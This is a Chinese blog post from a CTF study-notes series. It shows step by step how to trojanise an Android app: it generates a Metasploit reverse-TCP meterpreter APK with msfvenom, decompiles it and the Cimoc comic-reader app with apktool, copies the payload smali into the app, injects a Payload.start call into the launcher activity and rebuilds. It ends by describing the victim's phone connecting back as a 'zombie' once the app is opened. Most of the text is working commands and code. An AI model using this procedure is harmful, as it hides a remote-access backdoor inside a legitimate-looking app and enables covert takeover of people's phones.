---
title: CTF学习笔记（大学篇）07 —— 手动注入msf到指定的程序
date: 2022-06-25 00:10:20
tags: [CTF, msfconsole, apk, reverse, decompile]
categories: CTF
---

> 填坑回，因为之前在[CTF学习笔记（大学篇）05 —— 通过msfconsole和520apkhook创建带有后门程序的安卓程序 | GamerNoTitle (bili33.top)](https://bili33.top/posts/CTF-in-College-5/)这篇文章里面说有时间就写，然后写我们CTF俱乐部学期总结的时候就顺带讲了这个，所以就填了个坑

首先要生成带有后门程序的apk文件

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=5555 R > pentestlab.apk
```

这里的host我实际上填的是我的公网服务器的IP地址，生成以后，如果直接安装，手机是肯定会报毒的（特别是装的国产定制ROM如MIUI、COLOROS之类的），这个时候就要把我们的后门程序注入到其他的软件里面去

（装上了会像右边这个图标这样，啥也没有，而且点开除了打开了后门也不会有什么反应）![](https://cdn1.tianli0.top/gh/Vikutorika/assets@master/img/CTF-in-College-7/image-20220624233959348.png?download=true)

然后我们反编译一下软件，用Linux（可能会）自带的apktool（如果没有请直走右转Github）

```bash
┌──(gamernotitle㉿kali-vmware)-[~/apk]
└─$ java -jar apktool_2.6.1.jar d -f -o payload pentestlab.apk  
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
I: Using Apktool 2.6.1 on pentestlab.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /home/gamernotitle/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
```

![](https://cdn1.tianli0.top/gh/Vikutorika/assets@master/img/CTF-in-College-7/image-20220624234521311.png)

这样后门程序就反编译完了，接下来要反编译我们需要的软件

```
┌──(gamernotitle㉿kali-vmware)-[~/apk]
└─$ java -jar apktool_2.6.1.jar d -f -o original Cimoc.apk    
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
I: Using Apktool 2.6.1 on Cimoc.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /home/gamernotitle/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
```

接着把payload的文件弄到我们要注入的程序目录下

```bash
┌──(gamernotitle㉿kali-vmware)-[~/apk]
└─$ cp payload/smali/com/metasploit/stage original/smali/com/metasploit/stage -r
```

在软件反编译后的`AndroidManifest.xml`文件里面，会存放着软件的权限列表、活动列表等信息，在这里可以看到最开始启动了什么活动

```xml
<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:compileSdkVersion="29" android:compileSdkVersionCodename="10" package="com.hiroshi.cimoc" platformBuildVersionCode="29" platformBuildVersionName="10">
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="com.google.android.finsky.permission.BIND_GET_INSTALL_REFERRER_SERVICE"/>
    <uses-permission android:name="com.google.android.c2dm.permission.RECEIVE"/>
    <application android:allowBackup="true" android:appComponentFactory="androidx.core.app.CoreComponentFactory" android:icon="@mipmap/ic_launcher" android:label="@string/app_name" android:largeHeap="true" android:name="com.hiroshi.cimoc.App" android:requestLegacyExternalStorage="true" android:supportsRtl="true" android:theme="@style/AppTheme" android:usesCleartextTraffic="true">
        <activity android:name="com.hiroshi.cimoc.ui.activity.MainActivity" android:screenOrientation="unspecified" android:windowSoftInputMode="adjustPan">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity android:name="com.hiroshi.cimoc.ui.activity.ResultActivity" android:screenOrientation="unspecified"/>
        <activity android:name="com.hiroshi.cimoc.ui.activity.DetailActivity" android:screenOrientation="unspecified"/>
        <activity android:name="com.hiroshi.cimoc.ui.activity.ChapterActivity" android:screenOrientation="unspecified"/>
        <activity android:name="com.hiroshi.cimoc.ui.activity.TagEditorActivity" android:screenOrientation="unspecified"/>
        <activity android:name="com.hiroshi.cimoc.ui.activity.TaskActivity" android:screenOrientation="unspecified"/>
        <activity android:name="com.hiroshi.cimoc.ui.activity.SettingsActivity" android:screenOrientation="unspecified"/>
        <activity android:name="com.hiroshi.cimoc.ui.activity.settings.ReaderConfigActivity" android:screenOrientation="unspecified"/>
        <activity android:name="com.hiroshi.cimoc.ui.activity.BackupActivity" android:screenOrientation="unspecified"/>
        <activity android:name="com.hiroshi.cimoc.ui.activity.AboutActivity" android:screenOrientation="unspecified"/>
        <activity android:name="com.hiroshi.cimoc.ui.activity.CategoryActivity" android:screenOrientation="unspecified"/>
        <activity android:name="com.hiroshi.cimoc.ui.activity.SearchActivity" android:screenOrientation="unspecified"/>
        <activity android:name="com.hiroshi.cimoc.ui.activity.SourceDetailActivity" android:screenOrientation="unspecified"/>
        <activity android:name="com.hiroshi.cimoc.ui.activity.PartFavoriteActivity" android:screenOrientation="unspecified"/>
        <activity android:name="com.hiroshi.cimoc.ui.activity.DirPickerActivity" android:screenOrientation="unspecified"/>
        <activity android:configChanges="orientation|screenSize" android:name="com.hiroshi.cimoc.ui.activity.settings.EventSettingsActivity"/>
        <activity android:configChanges="orientation|screenSize" android:name="com.hiroshi.cimoc.ui.activity.PageReaderActivity"/>
        <activity android:configChanges="orientation|screenSize" android:name="com.hiroshi.cimoc.ui.activity.StreamReaderActivity"/>
        <service android:name="com.hiroshi.cimoc.service.DownloadService"/>
        <activity android:name="com.hiroshi.cimoc.ui.activity.BrowserFilter" android:theme="@android:style/Theme.NoDisplay">
            <intent-filter>
                <action android:name="android.intent.action.SEND"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <data android:mimeType="text/plain"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="cimoc"/>
                <data android:host="m.buka.cn" android:scheme="http"/>
                <data android:host="m.buka.cn" android:scheme="https"/>
                <data android:host="www.dm5.com" android:scheme="http"/>
                <data android:host="www.dm5.com" android:scheme="https"/>
                <data android:host="tel.dm5.com" android:scheme="http"/>
                <data android:host="tel.dm5.com" android:scheme="https"/>
                <data android:host="manhua.dmzj.com" android:scheme="http"/>
                <data android:host="manhua.dmzj.com" android:scheme="https"/>
                <data android:host="m.dmzj.com" android:scheme="http"/>
                <data android:host="m.dmzj.com" android:scheme="https"/>
                <data android:host="m.5qmh.com" android:scheme="http"/>
                <data android:host="m.5qmh.com" android:scheme="https"/>
                <data android:host="m.pufei.net" android:scheme="http"/>
                <data android:host="m.pufei.net" android:scheme="https"/>
                <data android:host="ac.qq.com" android:scheme="http"/>
                <data android:host="ac.qq.com" android:scheme="https"/>
                <data android:host="m.ac.qq.com" android:scheme="http"/>
                <data android:host="m.ac.qq.com" android:scheme="https"/>
                <data android:host="www.u17.com" android:scheme="http"/>
                <data android:host="www.u17.com" android:scheme="https"/>
                <data android:host="www.migudm.cn" android:scheme="http"/>
                <data android:host="www.migudm.cn" android:scheme="https"/>
                <data android:host="m.migudm.cn" android:scheme="http"/>
                <data android:host="m.migudm.cn" android:scheme="https"/>
                <data android:host="99770.hhxxee.com" android:scheme="http"/>
                <data android:host="99770.hhxxee.com" android:scheme="https"/>
                <data android:host="www.cartoonmad.com" android:scheme="http"/>
                <data android:host="www.cartoonmad.com" android:scheme="https"/>
                <data android:host="www.2animx.com" android:scheme="http"/>
                <data android:host="www.2animx.com" android:scheme="https"/>
                <data android:host="www.50mh.com" android:scheme="http"/>
                <data android:host="www.50mh.com" android:scheme="https"/>
                <data android:host="m.50mh.com" android:scheme="http"/>
                <data android:host="m.50mh.com" android:scheme="https"/>
                <data android:host="www.manhuadb.com" android:scheme="http"/>
                <data android:host="www.manhuadb.com" android:scheme="https"/>
                <data android:host="m.bnmanhua.com" android:scheme="http"/>
                <data android:host="m.bnmanhua.com" android:scheme="https"/>
                <data android:host="m.tohomh123.com" android:scheme="http"/>
                <data android:host="m.tohomh123.com" android:scheme="https"/>
                <data android:host="www.chuixue.net" android:scheme="http"/>
                <data android:host="www.chuixue.net" android:scheme="https"/>
                <data android:host="m.517manhua.com" android:scheme="http"/>
                <data android:host="m.517manhua.com" android:scheme="https"/>
            </intent-filter>
        </activity>
        <provider android:authorities="com.hiroshi.cimoc" android:exported="false" android:grantUriPermissions="true" android:name="androidx.core.content.FileProvider">
            <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/file_paths_public"/>
        </provider>
        <service android:directBootAware="true" android:exported="false" android:name="com.google.firebase.components.ComponentDiscoveryService">
            <meta-data android:name="com.google.firebase.components:com.google.firebase.crashlytics.CrashlyticsRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
            <meta-data android:name="com.google.firebase.components:com.google.firebase.remoteconfig.RemoteConfigRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
            <meta-data android:name="com.google.firebase.components:com.google.firebase.analytics.connector.internal.AnalyticsConnectorRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
            <meta-data android:name="com.google.firebase.components:com.google.firebase.abt.component.AbtRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
            <meta-data android:name="com.google.firebase.components:com.google.firebase.iid.Registrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
        </service>
        <receiver android:enabled="true" android:exported="false" android:name="com.google.android.gms.measurement.AppMeasurementReceiver"/>
        <receiver android:enabled="true" android:exported="true" android:name="com.google.android.gms.measurement.AppMeasurementInstallReferrerReceiver" android:permission="android.permission.INSTALL_PACKAGES">
            <intent-filter>
                <action android:name="com.android.vending.INSTALL_REFERRER"/>
            </intent-filter>
        </receiver>
        <service android:enabled="true" android:exported="false" android:name="com.google.android.gms.measurement.AppMeasurementService"/>
        <service android:enabled="true" android:exported="false" android:name="com.google.android.gms.measurement.AppMeasurementJobService" android:permission="android.permission.BIND_JOB_SERVICE"/>
        <receiver android:exported="true" android:name="com.google.firebase.iid.FirebaseInstanceIdReceiver" android:permission="com.google.android.c2dm.permission.SEND">
            <intent-filter>
                <action android:name="com.google.android.c2dm.intent.RECEIVE"/>
            </intent-filter>
        </receiver>
        <provider android:authorities="com.hiroshi.cimoc.firebaseinitprovider" android:exported="false" android:initOrder="100" android:name="com.google.firebase.provider.FirebaseInitProvider"/>
        <activity android:exported="false" android:name="com.google.android.gms.common.api.GoogleApiActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
        <meta-data android:name="com.google.android.gms.version" android:value="@integer/google_play_services_version"/>
        <service android:exported="false" android:name="com.google.android.datatransport.runtime.backends.TransportBackendDiscovery">
            <meta-data android:name="backend:com.google.android.datatransport.cct.CctBackendFactory" android:value="cct"/>
        </service>
        <service android:exported="false" android:name="com.google.android.datatransport.runtime.scheduling.jobscheduling.JobInfoSchedulerService" android:permission="android.permission.BIND_JOB_SERVICE"/>
        <receiver android:exported="false" android:name="com.google.android.datatransport.runtime.scheduling.jobscheduling.AlarmManagerSchedulerBroadcastReceiver"/>
    </application>
</manifest>
```

其中，下面这行就告诉我们启动了一个名为`com.hiroshi.cimoc.ui.activity.MainActivity`的活动

```xml
<activity android:name="com.hiroshi.cimoc.ui.activity.MainActivity" android:screenOrientation="unspecified" android:windowSoftInputMode="adjustPan">
```

然后我们找到这个活动的代码，把我们的函数修改一下，让它调用我们的后门（这里没有加固，也会被检测出来）

【这个寻找的过程其实很麻烦，特别是像tx和网E这种的，超级难找】

```java
invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V
```

找到我们的`AndroidManifest.xml`，在权限列表里面加入我们需要的权限，然后编译

```xml
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="com.google.android.finsky.permission.BIND_GET_INSTALL_REFERRER_SERVICE"/>
    <uses-permission android:name="com.google.android.c2dm.permission.RECEIVE"/>
```

（应用原来就有的权限，可以自己添加，格式可以参考Google的开发文档）

同样使用apktool进行编译

```bash
┌──(gamernotitle㉿kali-vmware)-[~/apk]
└─$ java -jar apktool_2.6.1.jar b ~/apk/original/ 
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
I: Using Apktool 2.6.1
I: Checking whether sources has changed...
I: Smaling smali folder into classes.dex...
I: Checking whether resources has changed...
I: Building resources...
I: Copying libs... (/lib)
I: Copying libs... (/kotlin)
I: Building apk file...
I: Copying unknown files/dir...
I: Built apk...
```

这样就编译完了，把软件放到手机上进行安装，打开后在服务器就可以看到肉鸡上线了
